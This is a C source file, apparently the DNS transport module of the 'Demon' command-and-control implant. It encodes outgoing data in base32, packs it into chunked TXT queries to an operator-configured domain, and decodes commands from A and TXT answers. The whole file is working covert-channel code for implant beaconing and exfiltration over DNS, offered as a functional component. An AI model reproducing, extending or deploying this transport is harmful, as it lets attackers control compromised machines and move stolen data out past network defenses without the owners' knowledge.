#include <Demon.h>

#include <core/TransportDns.h>
#include <core/MiniStd.h>

#ifdef TRANSPORT_DNS

/* ============================================================
 *  Base32 Encoding/Decoding (RFC 4648, lowercase, no padding)
 * ============================================================ */

DWORD DnsBase32Encode(
    _In_  PBYTE  Input,
    _In_  DWORD  InputLen,
    _Out_ PCHAR  Output,
    _In_  DWORD  OutputLen
) {
    CONST CHAR Alphabet[] = DNS_BASE32_ALPHABET;
    DWORD i      = 0;
    DWORD j      = 0;
    DWORD Bits   = 0;
    DWORD Buffer = 0;

    for ( i = 0; i < InputLen && j < OutputLen; i++ )
    {
        Buffer = ( Buffer << 8 ) | Input[ i ];
        Bits  += 8;

        while ( Bits >= 5 && j < OutputLen )
        {
            Bits -= 5;
            Output[ j++ ] = Alphabet[ ( Buffer >> Bits ) & 0x1F ];
        }
    }

    /* handle remaining bits (no padding) */
    if ( Bits > 0 && j < OutputLen )
    {
        Output[ j++ ] = Alphabet[ ( Buffer << ( 5 - Bits ) ) & 0x1F ];
    }

    return j;
}

DWORD DnsBase32Decode(
    _In_  PCHAR  Input,
    _In_  DWORD  InputLen,
    _Out_ PBYTE  Output,
    _In_  DWORD  OutputLen
) {
    DWORD i      = 0;
    DWORD j      = 0;
    DWORD Bits   = 0;
    DWORD Buffer = 0;
    CHAR  c      = 0;
    INT   Val    = 0;

    for ( i = 0; i < InputLen && j < OutputLen; i++ )
    {
        c = Input[ i ];

        /* decode character to 5-bit value */
        if ( c >= 'a' && c <= 'z' )
            Val = c - 'a';
        else if ( c >= 'A' && c <= 'Z' )
            Val = c - 'A';
        else if ( c >= '2' && c <= '7' )
            Val = c - '2' + 26;
        else
            continue; /* skip invalid chars */

        Buffer = ( Buffer << 5 ) | Val;
        Bits  += 5;

        if ( Bits >= 8 )
        {
            Bits -= 8;
            Output[ j++ ] = (BYTE)( ( Buffer >> Bits ) & 0xFF );
        }
    }

    return j;
}

/* ============================================================
 *  DNS Packet Construction
 * ============================================================ */

/*!
 * Write a DNS name (series of labels) into buffer.
 * @param Buf - output buffer
 * @param BufLen - size of output buffer
 * @param Name - dot-separated name string
 * @return bytes written
 */
static DWORD DnsWriteName(
    _Out_ PBYTE  Buf,
    _In_  DWORD  BufLen,
    _In_  PCHAR  Name
) {
    DWORD Offset = 0;
    PCHAR Start  = Name;
    PCHAR Ptr    = Name;

    while ( *Ptr )
    {
        if ( *Ptr == '.' )
        {
            DWORD LabelLen = (DWORD)( Ptr - Start );
            if ( LabelLen > DNS_MAX_LABEL_LEN )
                LabelLen = DNS_MAX_LABEL_LEN;

            if ( Offset + 1 + LabelLen > BufLen )
                break;

            Buf[ Offset++ ] = (BYTE)LabelLen;
            MemCopy( &Buf[ Offset ], Start, LabelLen );
            Offset += LabelLen;
            Start = Ptr + 1;
        }
        Ptr++;
    }

    /* last label (no trailing dot) */
    if ( Ptr > Start )
    {
        DWORD LabelLen = (DWORD)( Ptr - Start );
        if ( LabelLen > DNS_MAX_LABEL_LEN )
            LabelLen = DNS_MAX_LABEL_LEN;

        if ( Offset + 1 + LabelLen + 1 <= BufLen )
        {
            Buf[ Offset++ ] = (BYTE)LabelLen;
            MemCopy( &Buf[ Offset ], Start, LabelLen );
            Offset += LabelLen;
        }
    }

    /* null terminator for name */
    if ( Offset < BufLen )
        Buf[ Offset++ ] = 0x00;

    return Offset;
}

/*!
 * Simple integer to decimal string
 */
static DWORD IntToStr(
    _Out_ PCHAR  Buf,
    _In_  DWORD  BufLen,
    _In_  DWORD  Value
) {
    CHAR  Tmp[ 16 ] = { 0 };
    DWORD k = 0;
    DWORD m = 0;

    if ( Value == 0 )
    {
        Tmp[ k++ ] = '0';
    }
    else
    {
        while ( Value > 0 && k < 15 )
        {
            Tmp[ k++ ] = '0' + ( Value % 10 );
            Value /= 10;
        }
    }

    /* reverse into output */
    for ( m = 0; m < k && m < BufLen; m++ )
        Buf[ m ] = Tmp[ k - 1 - m ];

    return m;
}

/*!
 * Build the FQDN for a DNS query with encoded data.
 * Format: <b32data_labels>.<seq>.<total>.<agentid_hex>.<domain>
 */
static DWORD BuildFqdn(
    _Out_ PCHAR  Fqdn,
    _In_  DWORD  FqdnLen,
    _In_  PBYTE  Data,
    _In_  DWORD  DataLen,
    _In_  DWORD  AgentID,
    _In_  DWORD  SeqNum,
    _In_  DWORD  TotalParts,
    _In_  PCHAR  Domain
) {
    DWORD  Pos    = 0;
    CHAR   B32Data[ 256 ] = { 0 };
    DWORD  B32Len = 0;
    DWORD  i      = 0;

    /* encode data to base32 */
    if ( Data && DataLen > 0 )
    {
        B32Len = DnsBase32Encode( Data, DataLen, B32Data, sizeof(B32Data) );
    }

    /* split base32 data into labels of max 63 chars each */
    i = 0;
    while ( i < B32Len && Pos < FqdnLen - 1 )
    {
        DWORD ChunkLen = B32Len - i;
        if ( ChunkLen > DNS_MAX_LABEL_LEN )
            ChunkLen = DNS_MAX_LABEL_LEN;

        MemCopy( &Fqdn[ Pos ], &B32Data[ i ], ChunkLen );
        Pos += ChunkLen;
        Fqdn[ Pos++ ] = '.';
        i += ChunkLen;
    }

    /* append seq */
    Pos += IntToStr( &Fqdn[ Pos ], FqdnLen - Pos, SeqNum );
    Fqdn[ Pos++ ] = '.';

    /* append total */
    Pos += IntToStr( &Fqdn[ Pos ], FqdnLen - Pos, TotalParts );
    Fqdn[ Pos++ ] = '.';

    /* append agent ID as hex string */
    {
        CONST CHAR HexChars[] = "0123456789abcdef";
        INT j;
        for ( j = 7; j >= 0; j-- )
        {
            if ( Pos < FqdnLen )
                Fqdn[ Pos++ ] = HexChars[ ( AgentID >> ( j * 4 ) ) & 0xF ];
        }
    }
    Fqdn[ Pos++ ] = '.';

    /* append configured domain */
    {
        PCHAR d = Domain;
        while ( *d && Pos < FqdnLen - 1 )
        {
            Fqdn[ Pos++ ] = *d++;
        }
    }

    Fqdn[ Pos ] = '\0';
    return Pos;
}

DWORD DnsBuildQuery(
    _Out_ PCHAR  QueryBuf,
    _In_  DWORD  QueryBufLen,
    _In_  PBYTE  Data,
    _In_  DWORD  DataLen,
    _In_  DWORD  AgentID,
    _In_  WORD   SeqNum,
    _In_  WORD   TotalParts,
    _In_  PCHAR  Domain
) {
    PDNS_HEADER Header = NULL;
    DWORD       Offset = 0;
    CHAR        Fqdn[ DNS_MAX_NAME_LEN + 64 ] = { 0 };
    WORD        QueryType = DNS_TYPE_TXT;

    if ( QueryBufLen < DNS_HEADER_SIZE + 16 )
        return 0;

    /* build the FQDN with encoded data */
    BuildFqdn( Fqdn, sizeof(Fqdn), Data, DataLen, AgentID, SeqNum, TotalParts, Domain );

    /* Build DNS header */
    Header = (PDNS_HEADER)QueryBuf;
    Offset = DNS_HEADER_SIZE;

    /* Transaction ID — use lower 16 bits of tick count for randomness */
    Header->ID      = (UINT16)( __rdtsc() & 0xFFFF );
    Header->Flags   = 0x0100; /* standard query, recursion desired (big-endian) */
    Header->QDCount = 0x0100; /* 1 question (big-endian) */
    Header->ANCount = 0;
    Header->NSCount = 0;
    Header->ARCount = 0;

    /* Write question section — name as label sequence */
    Offset += DnsWriteName( (PBYTE)&QueryBuf[ Offset ], QueryBufLen - Offset, Fqdn );

    /* QTYPE */
    if ( Offset + 4 > QueryBufLen )
        return 0;

    QueryBuf[ Offset++ ] = (BYTE)( QueryType >> 8 );
    QueryBuf[ Offset++ ] = (BYTE)( QueryType & 0xFF );

    /* QCLASS = IN (1) */
    QueryBuf[ Offset++ ] = 0x00;
    QueryBuf[ Offset++ ] = 0x01;

    return Offset;
}

/* ============================================================
 *  DNS Response Parsing
 * ============================================================ */

/*!
 * Skip a DNS name in a response (handles compression pointers)
 */
static DWORD DnsSkipName(
    _In_ PBYTE Buf,
    _In_ DWORD Offset,
    _In_ DWORD BufLen
) {
    while ( Offset < BufLen )
    {
        BYTE Len = Buf[ Offset ];

        /* compression pointer */
        if ( ( Len & 0xC0 ) == 0xC0 )
        {
            return Offset + 2;
        }

        /* end of name */
        if ( Len == 0 )
        {
            return Offset + 1;
        }

        Offset += 1 + Len;
    }

    return Offset;
}

DWORD DnsParseResponse(
    _In_  PBYTE   Response,
    _In_  DWORD   RespLen,
    _Out_ PBYTE   Output,
    _Out_ DWORD   OutputLen
) {
    PDNS_HEADER Header    = NULL;
    DWORD       Offset    = 0;
    UINT16      AnCount   = 0;
    UINT16      QdCount   = 0;
    WORD        RType     = 0;
    UINT16      RDLength  = 0;
    DWORD       OutPos    = 0;

    if ( RespLen < DNS_HEADER_SIZE )
        return 0;

    Header = (PDNS_HEADER)Response;

    /* check response flag (QR bit) */
    if ( ( Header->Flags & 0x0080 ) == 0 )
        return 0;

    /* swap byte order for counts (network → host) */
    AnCount = ( ( Header->ANCount >> 8 ) & 0xFF ) | ( ( Header->ANCount & 0xFF ) << 8 );
    QdCount = ( ( Header->QDCount >> 8 ) & 0xFF ) | ( ( Header->QDCount & 0xFF ) << 8 );

    Offset = DNS_HEADER_SIZE;

    /* skip question section */
    for ( UINT16 i = 0; i < QdCount && Offset < RespLen; i++ )
    {
        Offset = DnsSkipName( Response, Offset, RespLen );
        Offset += 4; /* QTYPE + QCLASS */
    }

    if ( AnCount == 0 )
        return 0;

    /* Parse answer records */
    for ( UINT16 i = 0; i < AnCount && Offset < RespLen; i++ )
    {
        /* skip name */
        Offset = DnsSkipName( Response, Offset, RespLen );

        if ( Offset + 10 > RespLen )
            break;

        /* read type, skip class + TTL, read rdlength */
        RType    = ( Response[ Offset ] << 8 ) | Response[ Offset + 1 ];
        /* skip class (2) + TTL (4) */
        RDLength = ( Response[ Offset + 8 ] << 8 ) | Response[ Offset + 9 ];
        Offset  += 10;

        if ( Offset + RDLength > RespLen )
            break;

        if ( RType == DNS_TYPE_A && RDLength == 4 )
        {
            /* A record — 4 bytes of control/data */
            if ( OutPos + 4 <= OutputLen )
            {
                MemCopy( &Output[ OutPos ], &Response[ Offset ], 4 );
                OutPos += 4;
            }
            Offset += RDLength;
        }
        else if ( RType == DNS_TYPE_TXT )
        {
            /* TXT record — one or more <length><string> segments */
            DWORD RdEnd = Offset + RDLength;
            while ( Offset < RdEnd )
            {
                BYTE TxtLen = Response[ Offset++ ];
                if ( Offset + TxtLen > RdEnd )
                    break;

                /* base32 decode the TXT string */
                BYTE  DecodeBuf[ 512 ] = { 0 };
                DWORD DecodeLen = DnsBase32Decode( (PCHAR)&Response[ Offset ], TxtLen, DecodeBuf, sizeof(DecodeBuf) );

                if ( OutPos + DecodeLen <= OutputLen )
                {
                    MemCopy( &Output[ OutPos ], DecodeBuf, DecodeLen );
                    OutPos += DecodeLen;
                }

                Offset += TxtLen;
            }
        }
        else
        {
            Offset += RDLength;
        }
    }

    return OutPos;
}

/* ============================================================
 *  DNS Transport — Main Send/Receive
 * ============================================================ */

BOOL DnsSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
) {
    BOOL    Success     = FALSE;
    PBYTE   SendData    = Send->Buffer;
    DWORD   SendLen     = Send->Length;
    DWORD   TotalParts  = 0;
    DWORD   SeqNum      = 0;
    BYTE    QueryBuf[ DNS_MAX_UDP_SIZE ] = { 0 };
    BYTE    RecvBuf[ 4096 ]              = { 0 };
    DWORD   QueryLen    = 0;
    INT     RecvLen     = 0;
    SOCKET  Sock        = INVALID_SOCKET;
    WSADATA WsaData     = { 0 };

    /* Calculate chunks needed */
    TotalParts = ( SendLen + DNS_MAX_DATA_PER_QUERY - 1 ) / DNS_MAX_DATA_PER_QUERY;
    if ( TotalParts == 0 )
        TotalParts = 1;

    /* Init winsock if needed */
    if ( ! Instance->WSAWasInitialised )
    {
        Instance->Win32.WSAStartup( MAKEWORD(2,2), &WsaData );
        Instance->WSAWasInitialised = TRUE;
    }

    /* Create UDP socket */
    Sock = Instance->Win32.WSASocketA( AF_INET, SOCK_DGRAM, IPPROTO_UDP, NULL, 0, 0 );
    if ( Sock == INVALID_SOCKET )
    {
        PUTS_DONT_SEND( "DNS: Failed to create socket" )
        return FALSE;
    }

    /* Setup DNS server address */
    struct sockaddr_in DnsAddr = { 0 };
    WORD DnsPort = Instance->Config.Transport.DnsPort;
    if ( DnsPort == 0 ) DnsPort = 53;

    DnsAddr.sin_family = AF_INET;
    /* manual htons */
    DnsAddr.sin_port = (USHORT)( ( ( DnsPort & 0xFF ) << 8 ) | ( ( DnsPort >> 8 ) & 0xFF ) );

    /* Use configured DNS server IP, or fallback to 8.8.8.8 */
    if ( Instance->Config.Transport.DnsServerIp )
    {
        DnsAddr.sin_addr.s_addr = Instance->Config.Transport.DnsServerIp;
    }
    else
    {
        /* 8.8.8.8 in network byte order */
        DnsAddr.sin_addr.s_addr = 0x08080808;
    }

    /* Connect UDP socket */
    Instance->Win32.connect( Sock, (struct sockaddr*)&DnsAddr, sizeof(DnsAddr) );

    /* Initialize response */
    if ( Resp )
    {
        Resp->Buffer = NULL;
        Resp->Length = 0;
    }

    /* Send each chunk */
    for ( SeqNum = 0; SeqNum < TotalParts; SeqNum++ )
    {
        DWORD ChunkOffset = SeqNum * DNS_MAX_DATA_PER_QUERY;
        DWORD ChunkLen    = SendLen - ChunkOffset;
        if ( ChunkLen > DNS_MAX_DATA_PER_QUERY )
            ChunkLen = DNS_MAX_DATA_PER_QUERY;

        /* Build DNS query with this chunk */
        MemSet( QueryBuf, 0, sizeof(QueryBuf) );
        QueryLen = DnsBuildQuery(
            (PCHAR)QueryBuf,
            sizeof(QueryBuf),
            &SendData[ ChunkOffset ],
            ChunkLen,
            Instance->Session.AgentID,
            (WORD)SeqNum,
            (WORD)TotalParts,
            Instance->Config.Transport.Domain
        );

        if ( QueryLen == 0 )
        {
            PUTS_DONT_SEND( "DNS: DnsBuildQuery failed" )
            goto Cleanup;
        }

        /* Send query */
        Instance->Win32.send( Sock, (char*)QueryBuf, QueryLen, 0 );

        /* Receive response */
        MemSet( RecvBuf, 0, sizeof(RecvBuf) );
        RecvLen = Instance->Win32.recv( Sock, (char*)RecvBuf, sizeof(RecvBuf), 0 );

        if ( RecvLen <= 0 )
        {
            PUTS_DONT_SEND( "DNS: recv failed or timed out" )
            goto Cleanup;
        }

        /* Parse response from the last chunk (contains actual data) */
        if ( SeqNum == TotalParts - 1 && Resp )
        {
            BYTE   ParsedBuf[ 4096 ] = { 0 };
            DWORD  ParsedLen = DnsParseResponse( RecvBuf, RecvLen, ParsedBuf, sizeof(ParsedBuf) );

            if ( ParsedLen > 0 )
            {
                Resp->Buffer = Instance->Win32.LocalAlloc( LPTR, ParsedLen );
                if ( Resp->Buffer )
                {
                    MemCopy( Resp->Buffer, ParsedBuf, ParsedLen );
                    Resp->Length = ParsedLen;
                    Success = TRUE;
                }
            }
            else
            {
                /* No data in response — might be A record ACK (1.0.0.1) */
                Success = TRUE;
            }
        }
        else
        {
            /* intermediate chunk — ACK received */
            Success = TRUE;
        }
    }

Cleanup:
    if ( Sock != INVALID_SOCKET )
    {
        Instance->Win32.closesocket( Sock );
    }

    return Success;
}

#endif /* TRANSPORT_DNS */
